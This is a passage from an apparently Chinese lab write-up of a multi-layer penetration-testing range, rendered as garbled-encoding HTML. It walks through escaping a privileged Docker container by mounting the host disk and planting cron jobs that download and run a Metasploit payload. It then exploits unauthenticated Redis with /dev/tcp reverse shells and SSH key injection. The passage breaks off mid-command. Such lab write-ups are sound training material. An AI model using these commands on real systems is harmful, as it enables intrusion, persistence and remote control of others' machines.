style="zoom:50%;"><p>ä¹Ÿæ²¡æœ‰bashrcæ–‡ä»¶ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.21.24.png" style="zoom:50%;"></blockquote><h1 id="å››ã€å®¹å™¨é€ƒé€¸"><a href="#å››ã€å®¹å™¨é€ƒé€¸" class="headerlink" title="å››ã€å®¹å™¨é€ƒé€¸"></a>å››ã€å®¹å™¨é€ƒé€¸</h1><h2 id="4-1-runcå®¹å™¨é€ƒé€¸-CVE-2021-5736"><a href="#4-1-runcå®¹å™¨é€ƒé€¸-CVE-2021-5736" class="headerlink" title="4.1 runcå®¹å™¨é€ƒé€¸-CVE-2021-5736"></a>4.1 runcå®¹å™¨é€ƒé€¸-CVE-2021-5736</h2><p>è™½ç„¶ç›®æ ‡ç³»ç»Ÿçš„dockerå’Œruncç‰ˆæœ¬æ»¡è¶³CVE-2021-5736åˆ©ç”¨æ¡ä»¶ï¼Œä½†æ˜¯ubuntu 14.04ç‰ˆæœ¬ä¸æ»¡è¶³æ»¡è¶³æ¡ä»¶ï¼Œæœ€ç»ˆæœªåˆ©ç”¨æˆåŠŸã€‚</p><p>å…·ä½“è¿‡ç¨‹è§æœ¬ç«™ã€Šdockerå®¹å™¨é€ƒé€¸-CVE-2019-5736ã€‹ä¸€æ–‡ã€‚</p><h2 id="4-2-Dockerç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸"><a href="#4-2-Dockerç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸" class="headerlink" title="4.2 Dockerç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸"></a>4.2 Dockerç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸</h2><p>å…·ä½“çš„æ¼æ´å¤ç°è§æœ¬ç«™ã€ŠDockerç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸ã€‹ä¸€æ–‡ã€‚</p><p>MSFçš„ç”¨æ³•è§æœ¬ç«™ã€ŠMSF-Metasploitã€‹ä¸€æ–‡ã€‚</p><h3 id="4-2-1-å½“å‰æ¡ä»¶"><a href="#4-2-1-å½“å‰æ¡ä»¶" class="headerlink" title="4.2.1 å½“å‰æ¡ä»¶"></a>4.2.1 å½“å‰æ¡ä»¶</h3><p>å·²ç»è·å–åˆ°äº†rootæƒé™çš„å®¹å™¨shellã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2014.57.29.png" style="zoom:40%;"><h3 id="4-2-2-åˆ¤æ–­å®¹å™¨æ˜¯å¦ç‰¹æƒè¿è¡Œ"><a href="#4-2-2-åˆ¤æ–­å®¹å™¨æ˜¯å¦ç‰¹æƒè¿è¡Œ" class="headerlink" title="4.2.2 åˆ¤æ–­å®¹å™¨æ˜¯å¦ç‰¹æƒè¿è¡Œ"></a>4.2.2 åˆ¤æ–­å®¹å™¨æ˜¯å¦ç‰¹æƒè¿è¡Œ</h3><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2014.58.23.png" style="zoom:40%;"><p>CapEffçš„å€¼è¡¨æ˜å½“å‰å®¹å™¨æ˜¯ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„ã€‚</p><h3 id="4-2-3-æŒ‚è½½å®¿ä¸»æœºçš„æ ¹ç›®å½•"><a href="#4-2-3-æŒ‚è½½å®¿ä¸»æœºçš„æ ¹ç›®å½•" class="headerlink" title="4.2.3 æŒ‚è½½å®¿ä¸»æœºçš„æ ¹ç›®å½•"></a>4.2.3 æŒ‚è½½å®¿ä¸»æœºçš„æ ¹ç›®å½•</h3><p>åœ¨ä½æƒé™çš„shellæ˜¯æ²¡æ³•æ‰§è¡Œçš„ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.00.14.png" style="zoom:50%;"><p>åœ¨rootæƒé™çš„shellä¸­æ‰§è¡Œ<code>fdisk -l</code></p><blockquote><p><code>fdisk -l</code> æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨äºåˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„ç£ç›˜åˆ†åŒºä¿¡æ¯ã€‚<code>fdisk</code> æ˜¯ä¸€ä¸ªç£ç›˜åˆ†åŒºè¡¨æ“ä½œå·¥å…·ï¼Œè€Œ <code>-l</code> é€‰é¡¹ç”¨äºåˆ—å‡ºæ‰€æœ‰åˆ†åŒºè¡¨ä¿¡æ¯ï¼Œè€Œä¸è¿›è¡Œä»»ä½•ä¿®æ”¹.</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.01.06.png" style="zoom:40%;"><p>fdiskåˆ—å‡ºäº†å®¿ä¸»æœºçš„ç£ç›˜ç›®å½•ï¼Œé‡ç‚¹å…³æ³¨å¸¦*çš„ç£ç›˜åˆ†åŒºï¼Œè¿™ä»£è¡¨å®¿ä¸»æœºçš„å¯åŠ¨ç£ç›˜ã€‚</p><p>åˆ›å»ºä¸€ä¸ªç›®å½•ï¼ŒæŒ‚è½½/dev/sda1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> hack<span class="token function">mount</span> /dev/sda1 /home/hack<span class="token function">ls</span> hack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.04.10.png" style="zoom:40%;"><p>å¯ä»¥çœ‹åˆ°å®¿ä¸»æœºçš„ç£ç›˜æ–‡ä»¶å·²ç»æŒ‚è½½åˆ°äº†hackç›®å½•ä¸­ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå¯ä»¥é€šè¿‡æ“ä½œå®¿ä¸»æœºçš„ç£ç›˜ç›®å½•æ¥ç¯¡æ”¹å®šæ—¶ä»»åŠ¡ï¼Œæ‰§è¡Œåå¼¹shellçš„æ“ä½œã€‚</p><h3 id="4-2-4-MSF-web-deliveryæ¨¡å—åˆ›å»ºpayload"><a href="#4-2-4-MSF-web-deliveryæ¨¡å—åˆ›å»ºpayload" class="headerlink" title="4.2.4 MSF-web_deliveryæ¨¡å—åˆ›å»ºpayload"></a>4.2.4 MSF-web_deliveryæ¨¡å—åˆ›å»ºpayload</h3><p>é¦–å…ˆä½¿ç”¨metasploitçš„web_deliveryæ¨¡å—ç”Ÿæˆpayloadå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> target <span class="token number">7</span>    <span class="token comment"># é€‰æ‹©ç›®æ ‡ç³»ç»Ÿ</span><span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.43.26<span class="token builtin class-name">set</span> lport <span class="token number">4446</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.15.55.png" style="zoom:50%;"><p>æ‰§è¡Œexploitä¹‹åï¼Œæ³¨æ„çœ‹æœ€åçš„æç¤ºï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåœ¨å—å®³ä¸»æœºä¸Šæ‰§è¡Œä¸€ä¸ªåå¼¹shellçš„è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> 4dsxUgj2 --no-check-certificate http://192.168.43.26:8080/l16V8k4P5u5n56<span class="token punctuation">;</span> <span class="token function">chmod</span> +x 4dsxUgj2<span class="token punctuation">;</span> ./4dsxUgj2<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.16.43.png" style="zoom:50%;"><h3 id="4-2-5-å†™å…¥æ¶æ„å®šæ—¶ä»»åŠ¡"><a href="#4-2-5-å†™å…¥æ¶æ„å®šæ—¶ä»»åŠ¡" class="headerlink" title="4.2.5 å†™å…¥æ¶æ„å®šæ—¶ä»»åŠ¡"></a>4.2.5 å†™å…¥æ¶æ„å®šæ—¶ä»»åŠ¡</h3><h4 id="1ï¼‰å†™å…¥-var-spool-cron-crontabs-rootä¸­"><a href="#1ï¼‰å†™å…¥-var-spool-cron-crontabs-rootä¸­" class="headerlink" title="1ï¼‰å†™å…¥ /var/spool/cron/crontabs/rootä¸­"></a>1ï¼‰å†™å…¥ /var/spool/cron/crontabs/rootä¸­</h4><p>åœ¨rootæƒé™çš„å®¹å™¨shellä¸­å†™å…¥å®šæ—¶ä»»åŠ¡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'* * * * * wget -qO 4dsxUgj2 --no-check-certificate http://192.168.43.26:8080/l16V8k4P5u5n56; chmod +x 4dsxUgj2; ./4dsxUgj2&amp; disown'</span> <span class="token operator">&gt;&gt;</span> hack/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.22.13.png" style="zoom:50%;"><p>å®šæ—¶ä»»åŠ¡å†™å…¥æˆåŠŸã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> hack/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.22.48.png" style="zoom:50%;"><p>ä½†æ˜¯meterpreterä¸Šçº¿å¤±è´¥ã€‚</p><h4 id="2ï¼‰å†™å…¥-etc-crontab-ä¸­"><a href="#2ï¼‰å†™å…¥-etc-crontab-ä¸­" class="headerlink" title="2ï¼‰å†™å…¥ /etc/crontab ä¸­"></a>2ï¼‰å†™å…¥ /etc/crontab ä¸­</h4><p>å†™å…¥å®¿ä¸»æœºçš„/etc/crontabæ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'* * * * * root wget -qO wxnPcafS --no-check-certificate http://192.168.43.26:8080/lXJ0n5m; chmod +x wxnPcafS; ./wxnPcafS&amp; disown'</span> <span class="token operator">&gt;&gt;</span> /home/hack/etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.56.13.png" style="zoom:30%;"><p>å—å®³å®¿ä¸»æœºæˆåŠŸä¸Šçº¿ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.56.43.png" alt="å®¿ä¸»æœºä¸Šçº¿" style="zoom:50%;"><p>æ£€æŸ¥æƒé™ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.57.30.png" alt="rootæƒé™è·å–æˆåŠŸ" style="zoom:50%;"><p>è‡³æ­¤web2è¿™å°æœºå­æˆåŠŸæ‹¿ä¸‹rootæƒé™ã€‚</p><p>ä¸Šé¢çš„å®šæ—¶ä»»åŠ¡ä¼šæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œä¼šåœ¨meterpreterç–¯ç‹‚å¼¹ä¸Šçº¿ï¼Œå¹¶ä¸”ä¼šå¿«é€Ÿå æ»¡ç›®æ ‡æœºå™¨çš„ç½‘ç»œèµ„æºï¼Œå¯ä»¥é€‚å½“è°ƒæ•´æ‰§è¡Œå‘¨æœŸï¼Œå¦‚ä¸‹é¢çš„è®¾ç½®ï¼Œä¼šåœ¨æ¯ä¸ªå°æ—¶çš„ç¬¬10åˆ†ä¸­æ‰§è¡Œä¸€æ¬¡:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10 * * * * root wget -qO JNV5T7e6 --no-check-certificate http://172.20.10.4:8080/UvxhUc3By33; chmod +x JNV5T7e6; ./JNV5T7e6&amp; disown'</span> <span class="token operator">&gt;&gt;</span> /home/hack/etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥ç”¨dateå‘½ä»¤è·å–ä¸€ä¸‹ç³»ç»Ÿæ—¶é—´ï¼Œç„¶åæŒ‡å®šåœ¨ä¸€æ®µæ—¶é—´åè§¦å‘ä¸€æ¬¡ï¼Œä½†æ˜¯å¦‚æœæ‹¿ä¸‹çš„æ˜¯å®¹å™¨ï¼Œå¯èƒ½å®¹å™¨æ—¶é—´å’Œå®¿ä¸»æœºæ—¶é—´ä¼šä¸åŒï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ã€‚</p><h2 id="4-3-ä¿¡æ¯æ”¶é›†"><a href="#4-3-ä¿¡æ¯æ”¶é›†" class="headerlink" title="4.3 ä¿¡æ¯æ”¶é›†"></a>4.3 ä¿¡æ¯æ”¶é›†</h2><h3 id="4-3-2-ç³»ç»ŸåŸºæœ¬ä¿¡æ¯"><a href="#4-3-2-ç³»ç»ŸåŸºæœ¬ä¿¡æ¯" class="headerlink" title="4.3.2 ç³»ç»ŸåŸºæœ¬ä¿¡æ¯"></a>4.3.2 ç³»ç»ŸåŸºæœ¬ä¿¡æ¯</h3><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.14.42.png" style="zoom:50%;"><h3 id="4-3-1-ç½‘ç»œä¿¡æ¯"><a href="#4-3-1-ç½‘ç»œä¿¡æ¯" class="headerlink" title="4.3.1 ç½‘ç»œä¿¡æ¯"></a>4.3.1 ç½‘ç»œä¿¡æ¯</h3><p>åªæœ‰ä¸¤ä¸ªç½‘æ®µ 192.168.52.20/24  å’Œ 192.168.93.10/24ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.07.14.png" alt="192.168.52.20/24" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.07.44.png" style="zoom:50%;"><p>ä½†æ˜¯æˆ‘ä»¬æ˜æ˜æ˜¯ä»192.168.43.253:81è¿™ä¸ªç«¯å£æ‰“è¿›å®¹å™¨ï¼Œå¹¶è·å¾—å®¿ä¸»æœºrootæƒé™çš„ã€‚</p><p>åˆ†æï¼š192.168.43.253:81æ˜¯è¢«æ”»é™·çš„è¿™å°ä¸»æœºçš„åå‘ä»£ç†ã€‚</p><h3 id="4-3-2-ä½¿ç”¨rootæƒé™è¿›å…¥ç›®æ ‡ä¸»æœºçš„shell"><a href="#4-3-2-ä½¿ç”¨rootæƒé™è¿›å…¥ç›®æ ‡ä¸»æœºçš„shell" class="headerlink" title="4.3.2 ä½¿ç”¨rootæƒé™è¿›å…¥ç›®æ ‡ä¸»æœºçš„shell"></a>4.3.2 ä½¿ç”¨rootæƒé™è¿›å…¥ç›®æ ‡ä¸»æœºçš„shell</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">metepreter<span class="token operator">&gt;</span>shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.19.48.png" style="zoom:50%;"><p>é€šè¿‡å®¹å™¨æ˜ å°„å‘å¤–æš´éœ²8000ç«¯å£ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.20.26.png" style="zoom:30%;"><h1 id="äº”ã€redisæœªæˆæƒè®¿é—®getshell"><a href="#äº”ã€redisæœªæˆæƒè®¿é—®getshell" class="headerlink" title="äº”ã€redisæœªæˆæƒè®¿é—®getshell"></a>äº”ã€redisæœªæˆæƒè®¿é—®getshell</h1><p>åœ¨æœ€å¼€å§‹çš„ä¿¡æ¯æ”¶é›†ä¸­ï¼Œèƒ½å¤Ÿçœ‹åˆ°192.168.43.253è¿™å°æœºå­å¼€å¯äº†redis 6379ç«¯å£ï¼Œä¸”ç‰ˆæœ¬ä¸º2.8.17ã€‚ä»åŸºæœ¬çš„ä¿¡æ¯çœ‹æ˜¯ææœ‰å¯èƒ½å­˜åœ¨redisæœªæˆæƒè®¿é—®æ¼æ´çš„ã€‚</p><p>å…³äºredisæœªæˆæƒè®¿é—®æ¼æ´çš„å¤ç°å’Œåˆ©ç”¨æ–¹æ³•ï¼Œè¯¦è§æœ¬ç«™ã€Šredisæœªæˆæƒè®¿é—®æ¼æ´ã€‹ä¸€æ–‡ï¼š<a href="https://sxksec.cn/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/">https://sxksec.cn/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/</a></p><h2 id="5-1-æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯æ¢æµ‹"><a href="#5-1-æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯æ¢æµ‹" class="headerlink" title="5.1 æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯æ¢æµ‹"></a>5.1 æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯æ¢æµ‹</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.24.33.png" style="zoom:40%;"><h2 id="5-2-æ¼æ´æ¢æµ‹"><a href="#5-2-æ¼æ´æ¢æµ‹" class="headerlink" title="5.2 æ¼æ´æ¢æµ‹"></a>5.2 æ¼æ´æ¢æµ‹</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.43.253<span class="token operator">&gt;</span>info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.26.23.png" style="zoom:30%;"><p>å¯ä»¥çœ‹åˆ°kaliæœªç»æˆæƒå°±å¯ä»¥è¿æ¥åˆ°è¿œç«¯é¶æœºçš„redisæœåŠ¡ã€‚</p><h2 id="5-3-æ¼æ´åˆ©ç”¨"><a href="#5-3-æ¼æ´åˆ©ç”¨" class="headerlink" title="5.3 æ¼æ´åˆ©ç”¨"></a>5.3 æ¼æ´åˆ©ç”¨</h2><h3 id="5-3-1-å†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰"><a href="#5-3-1-å†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰" class="headerlink" title="5.3.1 å†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰"></a>5.3.1 å†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰</h3><h4 id="1ï¼‰å¦‚æœredisæœåŠ¡çš„ç”¨æˆ·æƒé™è¾ƒä½æ— æ³•åˆ©ç”¨"><a href="#1ï¼‰å¦‚æœredisæœåŠ¡çš„ç”¨æˆ·æƒé™è¾ƒä½æ— æ³•åˆ©ç”¨" class="headerlink" title="1ï¼‰å¦‚æœredisæœåŠ¡çš„ç”¨æˆ·æƒé™è¾ƒä½æ— æ³•åˆ©ç”¨"></a>1ï¼‰å¦‚æœredisæœåŠ¡çš„ç”¨æˆ·æƒé™è¾ƒä½æ— æ³•åˆ©ç”¨</h4><blockquote><h4 id="ubuntuè®¡åˆ’ä»»åŠ¡ç›®å½•ï¼š"><a href="#ubuntuè®¡åˆ’ä»»åŠ¡ç›®å½•ï¼š" class="headerlink" title="ubuntuè®¡åˆ’ä»»åŠ¡ç›®å½•ï¼š"></a>ubuntuè®¡åˆ’ä»»åŠ¡ç›®å½•ï¼š</h4><p>åœ¨ Ubuntu ç³»ç»Ÿä¸­ï¼Œä¸å­˜åœ¨ <code>/var/spool/cron/root</code> è¿™ä¸ªç›®å½•ã€‚</p><ul><li><strong>å…³äº cron ä»»åŠ¡å­˜å‚¨ä½ç½®</strong>ï¼šUbuntu ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·çš„ cron ä»»åŠ¡é€šå¸¸å­˜å‚¨åœ¨ <code>/var/spool/cron/crontabs</code> ç›®å½•ä¸‹ã€‚æ¯ä¸ªç”¨æˆ·çš„ cron ä»»åŠ¡æ–‡ä»¶ä»¥ç”¨æˆ·åå‘½åï¼Œä¾‹å¦‚ root ç”¨æˆ·çš„ cron ä»»åŠ¡æ–‡ä»¶å°±æ˜¯ <code>/var/spool/cron/crontabs/root</code>ã€‚è¿™ä¸ªæ–‡ä»¶åŒ…å«äº† root ç”¨æˆ·è®¾ç½®çš„å®šæ—¶ä»»åŠ¡ï¼Œå¦‚å®šæ—¶å¤‡ä»½æ•°æ®ã€å®šæ—¶æ¸…ç†æ—¥å¿—ç­‰æ“ä½œã€‚</li><li><strong>æƒé™å’Œå®‰å…¨æ€§</strong>ï¼š<code>/var/spool/cron/crontabs</code> ç›®å½•çš„æƒé™è®¾ç½®æ¯”è¾ƒä¸¥æ ¼ï¼Œåªæœ‰ç‰¹å®šçš„ç”¨æˆ·å’Œç»„ï¼ˆé€šå¸¸æ˜¯ crontab ç»„ï¼‰æ‰æœ‰æƒé™è®¿é—®å’Œä¿®æ”¹å…¶ä¸­çš„æ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æœªæˆæƒçš„ç”¨æˆ·ä¿®æ”¹ cron ä»»åŠ¡ï¼Œä»è€Œä¿è¯ç³»ç»Ÿçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§ã€‚</li></ul></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.31.23.png" style="zoom:40%;"><p>æ— æ³•è®¾ç½®ä¸ºè¿™ä¸ªç›®å½•ã€‚æƒé™ä¸å¤Ÿã€‚</p><p>å°è¯•ä½¿ç”¨/etc/crontabæ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> hahaha <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.38.57.png" style="zoom:50%;"><p>saveçš„æ—¶å€™æŠ¥é”™ã€‚åˆ©ç”¨å¤±è´¥ã€‚å¯èƒ½æ˜¯å› ä¸ºæƒé™é—®é¢˜ã€‚</p><p>ä¸ºäº†å®éªŒé¡ºåˆ©è¿›è¡Œï¼Œweb1è¿™å°é¶æœºçš„redisæœåŠ¡åº”è¯¥ä»¥rootæƒé™å¯åŠ¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> redis-server /etc/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2ï¼‰åœ¨-var-spool-cron-crontabs-rootå†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰"><a href="#2ï¼‰åœ¨-var-spool-cron-crontabs-rootå†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰" class="headerlink" title="2ï¼‰åœ¨/var/spool/cron/crontabs/rootå†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰"></a>2ï¼‰åœ¨/var/spool/cron/crontabs/rootå†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆå¤±è´¥ï¼‰</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/crontabsconfig <span class="token builtin class-name">set</span> dbfilename root<span class="token builtin class-name">set</span> xxxxx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.06.13.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.09.36.png" style="zoom:50%;"><p>æ”»å‡»ç«¯å¹¶æ²¡æœ‰æ¥æ”¶åˆ°shellã€‚</p><h4 id="3ï¼‰åœ¨-etc-crontabå†™å…¥è®¡åˆ’ä»»åŠ¡"><a href="#3ï¼‰åœ¨-etc-crontabå†™å…¥è®¡åˆ’ä»»åŠ¡" class="headerlink" title="3ï¼‰åœ¨/etc/crontabå†™å…¥è®¡åˆ’ä»»åŠ¡"></a>3ï¼‰åœ¨/etc/crontabå†™å…¥è®¡åˆ’ä»»åŠ¡</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etcconfig <span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span><span class="token builtin class-name">set</span> xxxxx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.11.24.png" style="zoom:40%;"><p>æ”»å‡»ç«¯æ²¡æœ‰æ¥æ”¶åˆ°å›è¿çš„shellã€‚</p><h3 id="5-3-2-ä¸Šä¼ sshå…¬é’¥"><a href="#5-3-2-ä¸Šä¼ sshå…¬é’¥" class="headerlink" title="5.3.2 ä¸Šä¼ sshå…¬é’¥"></a>5.3.2 ä¸Šä¼ sshå…¬é’¥</h3><p>å°†å…¬é’¥å†™å…¥key.txtæ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /root/.ssh<span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span><span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> /root/key.txt<span class="token function">cat</span> /root/key.txt <span class="token operator">|</span>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.43.253 <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> pubredis-cli <span class="token parameter variable">-h</span> <span class="token 